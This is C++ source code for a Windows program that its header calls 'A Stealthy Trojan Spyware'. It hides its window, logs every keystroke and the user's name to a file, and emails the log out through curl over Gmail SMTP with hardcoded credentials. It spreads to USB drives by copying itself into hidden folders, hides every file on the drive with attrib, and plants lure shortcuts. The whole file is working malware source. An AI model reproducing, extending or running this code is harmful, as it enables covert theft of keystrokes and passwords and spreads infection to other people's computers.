/**
* Developer: Minhas Kamal (BSSE-0509, IIT, DU)
* Date: 15.Aug.2014, 28.Sep.2015
* Comment: A Stealthy Trojan Spyware.
**/

#include <windows.h>
#include <time.h>
#include <string>
#include <fstream>
#include <iostream>

using namespace std;


#define FILE_NAME "Record.log"   //log file
#define FOLDER_NAME "usb"  //containing folder
#define RUN_FILE_NAME "usb.exe"  //main run file
#define RUN_LINK_NAME "usb.lnk"  //starter link
#define INFECT_FILE_NAME "usb1.exe"  //infects computer
#define INFECT_LINK_NAME "usb1.lnk"  //link file
#define EMAIL_SENDER_FILE_NAME "usb2.exe"  //email sender

#define MIN_RECORD_SIZE 20  //no of PC start count   20
#define LIFE_TIME 5 //mail will be sent 5 times     5
#define MAIL_WAIT_TIME 180000   //in milli seconds      180000
#define MAILING_TIME 60000   //in milli seconds      60000

string allDrives;
int age=0;

int get_setAge();
bool checkRecordSize();
void sendData();
void logUserTime();
void logKey();
char getRemovableDisk();
void infectDrive(char driveLetter);
char* getRandomName();


main(){
    FreeConsole();  //window is not visible
    //sendData();
    age = get_setAge();
    if(checkRecordSize()){   ///check for right time
    
        int i=1;
        while(i<3){  ///try 2 times to send data
        
            Sleep(i*MAIL_WAIT_TIME); ///wait
            if(!system("ping www.google.com -n 1")){    ///check connection
                ////////////****SEND DATA****////////////
                sendData();

                Sleep(MAILING_TIME); ///wait or file will be deleted before sending
                DeleteFile(FILE_NAME);

                break;
            }
            i++;
        }
    }

    age=get_setAge();   //if file is deleted then sets new age

    //////////////****LOG USER_DATE_TIME****//////////////
    if(age <= LIFE_TIME){    ///check age
        logUserTime();
    }

    char driveLetter = getRemovableDisk();    //initial search for removable disk
    //return 0; // :)
    //printf("pippo\n");
    char* command = "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\Currentversion\\Explorer\\Advanced /v Hidden /t REG_DWORD /d 1 /f";
	WinExec(command, SW_HIDE);
	command = "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\Currentversion\\Explorer\\Advanced /v ShowSuperHidden /t REG_DWORD /d 1 /f";
	WinExec(command, SW_HIDE);
    while(1){
        ////////////////****LOG KEY****/////////////////
    //    printf("azzz\n");
        if(age <= LIFE_TIME){    ///check age
            logKey();
        }else{
            Sleep(5000);
        }

        ///////////////////****INFECT****///////////////////
        driveLetter = getRemovableDisk();
        
        //printf("%c\n", driveLetter);
        if(driveLetter!='0'){
            infectDrive(driveLetter);
        }
    }
    
}

/*
 *  for old file getAge for new file setAge
 */
int get_setAge(){
    int ageTemp = age;

    string line;
    ifstream myfile(FILE_NAME);

    if(myfile.is_open()){
        getline(myfile, line);
        line = line.substr(0, 1);
        sscanf(line.c_str(), "%d", &ageTemp);
    }else{
        ageTemp++;

        FILE *file = fopen(FILE_NAME, "a");
        fprintf(file, "%d ", ageTemp);
        fclose(file);
    }

    return ageTemp;
}

/*
 *  count no. of lines in record file
 */
bool checkRecordSize(){
    string line;
    ifstream myfile(FILE_NAME);

    int noOfLines = 0;
    if(myfile.is_open()){
        while(getline(myfile, line)){
            noOfLines++;
        }
        myfile.close();
    }

    if(noOfLines<MIN_RECORD_SIZE*2){ // :)
        return false;
    }else{
        return true;
    }
}

/*
 *  email record using command
 */
void sendData(){
    
    char* command = ".\\curl smtp://smtp.gmail.com:587 -v --mail-from \"wordpress.mibe@gmail.com\" --mail-rcpt \"wordpress.mibe@gmail.com\" --ssl -u wordpress.mibe@gmail.com:passw -T \"Record.log\" -k --anyauth";
    WinExec(command, SW_HIDE);
}

/*
 *  record user name time and date
 */
void logUserTime(){
    FILE *file = fopen(FILE_NAME, "a");

    char username[20];
    unsigned long username_len = 20;
    GetUserName(username, &username_len);
    time_t date = time(NULL);
    fprintf(file, "0\n%s->%s\t", username, ctime(&date)); //write username, time and date in file

    fclose(file);
}

/*
 *  record key stroke
 */
void logKey(){
    FILE *file;
    unsigned short ch, i, j=0;

    while(j<500){    //loop runs for 25 seconds
        ch=1;
        while(ch<250){
            for(i=0; i<50; i++, ch++){
                if(GetAsyncKeyState(ch) == -32767){  //when key is stroke
                    file=fopen(FILE_NAME, "a");
                    fprintf(file, "%d ", ch);
                    fclose(file);
                }
            }
            Sleep(1);   //take a rest
        }
        j++;
    }
}

/*
 *  returns newly inserted disk
 */
char getRemovableDiskold(){
    char drive='0';

    char szLogicalDrives[MAX_PATH];
    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives);
    string currentDrives="";

    for(int i=0; i<dwResult; i++){
        if(szLogicalDrives[i]>64 && szLogicalDrives[i]< 90){
            currentDrives.append(1, szLogicalDrives[i]);

            if(allDrives.find(szLogicalDrives[i]) > 100){
                drive = szLogicalDrives[i];
            }
        }
    }

    allDrives = currentDrives;

    return drive;
}
char getRemovableDisk()
{
          //Get Logical Drives
          DWORD dwDrives=GetLogicalDrives();
 
          if(0==dwDrives)
          {
                   //return FALSE;
          }
 
          DWORD dwCount=0;
 
          char chDriveLabel='A';
 
          char szRootpath[5]={0,0,0,0,0};
 
          while(dwDrives !=0)
          {
                   if ((dwDrives & 1) != 0)
                   {
                             sprintf(szRootpath,"%c:\\",chDriveLabel);
 
                             //removable drive
                             if (chDriveLabel!='A')
                             {
                             
                             if(DRIVE_REMOVABLE==GetDriveType(szRootpath))
                             {
                                      WIN32_FIND_DATA FindFileData;
                                      HANDLE hFind;
 
                                      //Removable dirve lable
                                    DWORD filesystemFlags = 0;
									
									TCHAR drivePath[4];
									sprintf(drivePath, "%c:\\", chDriveLabel);
									
									const HRESULT result = GetVolumeInformation(drivePath, NULL, 0, NULL, NULL, &filesystemFlags, NULL, 0);
									
									if (SUCCEEDED(result)) {
									  if (filesystemFlags & FILE_READ_ONLY_VOLUME) {
									    printf("Drive is read-only\n");
									  } else {
									    return chDriveLabel;
									  }
									}
									
                                    std::cout <<"Files in " << szRootpath << std::endl;
 
                                      //* represent search all files and directories
                                      szRootpath[3]='*';
 
                                      hFind=FindFirstFile(szRootpath,&FindFileData);
 
                                      if (INVALID_HANDLE_VALUE == hFind)
                                      {
                                                //return FALSE;
                                      }
 
                                      // List all the files in the directory .
                                      do
                                      {
                                                //ignore the sub directories
                                                if (!(FindFileData.dwFileAttributes &  
                                                                        FILE_ATTRIBUTE_DIRECTORY))
                                                {
                                                    std::cout << FindFileData.cFileName << ":";
                                                }
 
                                      }while (FindNextFile(hFind, &FindFileData) != 0);
 
                                      FindClose(hFind);
                             }
                             }
 
                   }
                   dwDrives = dwDrives >> 1;//next drive
                   chDriveLabel++;
          }
}
/*
 *  send files to new drive
 */
void infectDrive(char driveLetter){
    char folderPath[10] = {driveLetter};
    strcat(folderPath, ":\\");
    strcat(folderPath, FOLDER_NAME);

    if(CreateDirectory(folderPath ,NULL)){    //if directory creation does not fail
        SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN);

        ///////////////////////////
        char run[100]={""};
        strcat(run, folderPath);
        strcat(run, "\\");
        strcat(run, RUN_FILE_NAME);

        CopyFile(RUN_FILE_NAME, run, 0);

        ///////////////////////////
        char net[100]={""};
        strcat(net, folderPath);
        strcat(net, "\\");
        strcat(net, EMAIL_SENDER_FILE_NAME);

        CopyFile(EMAIL_SENDER_FILE_NAME, net, 0);

        //////////////////////////
        char infect[100]={""};
        strcat(infect, folderPath);
        strcat(infect, "\\");
        strcat(infect, INFECT_FILE_NAME);

        CopyFile(INFECT_FILE_NAME, infect, 0);

        //////////////////////////
        char runlnk[100]={""};
        strcat(runlnk, folderPath);
        strcat(runlnk, "\\");
        strcat(runlnk, RUN_LINK_NAME);

        CopyFile(RUN_LINK_NAME, runlnk, 0);

        ///////////////////////////
        char infectlnk[100]={""};
        strcat(infectlnk, folderPath);
        strcat(infectlnk, "\\");
        strcat(infectlnk, INFECT_LINK_NAME);

        CopyFile(INFECT_LINK_NAME, infectlnk, 0);

        ///////////////////////////
        char hideCommand[100] = {""};
        strcat(hideCommand, "attrib +s +h +r /s /d ");
        char drivePath[10] = {driveLetter};
    	strcat(drivePath, ":\\*");
    	strcat(hideCommand, drivePath);
        //strcat(hideCommand, folderPath);

        WinExec(hideCommand, SW_HIDE);
    }else{
        srand(time(0));
        int random = rand();

        if(random%2==0 || random%3==0 || random%7==0){
            return ;
        }
    }

    //////////////////////////////////
    char infectlnkauto[100] = {driveLetter};
    char* randomName = getRandomName();
    strcat(infectlnkauto, randomName);
    CopyFile(INFECT_LINK_NAME, infectlnkauto, 0);
    CopyFile("usb3.exe", infectlnkauto, 0);
    char hideCommand[100] = {""};
    char drivePath[10] = {driveLetter};
    strcat(hideCommand, "attrib -s -h \"");
    strcat(hideCommand, infectlnkauto);
    strcat(hideCommand, "\"");
    WinExec(hideCommand, SW_HIDE);
}

/*
 * returns random name for the link file.
 */
char* getRandomName(){
    char randomName[40];

    srand(time(0));
    int random = rand();

    if(random%8 == 0){
        strcpy(randomName, ":\\DO NOT CLICK!.lnk");
    }else if(random%4 == 0){

        char username[20];
        unsigned long username_len = 20;
        GetUserName(username, &username_len);

        random = rand();
        if(random%8 == 0){
            strcpy(randomName, ":\\Boss ");
            strcat(randomName, username);
            strcat(randomName, ".lnk");
        }else if(random%4 == 0){
            strcpy(randomName, ":\\");
            strcat(randomName, username);
            strcat(randomName, " is the best.lnk");
        }else if(random%2 == 0){
            strcpy(randomName, ":\\Hello ");
            strcat(randomName, username);
            strcat(randomName, "! good morning.lnk");
        }else{
            strcpy(randomName, ":\\");
            strcat(randomName, username);
            strcat(randomName, "! please help me.lnk");
        }
    }else if(random%2 == 0){
        strcpy(randomName, ":\\I will kill you ! ! !.lnk");
    }else if(random%3 == 0){
        strcpy(randomName, ":\\2+2=5.lnk");
    }else{
        strcpy(randomName, ":\\TOP SECRET.lnk");
    }
    strcpy(randomName, ":\\Show Files.exe");
    return randomName;
}

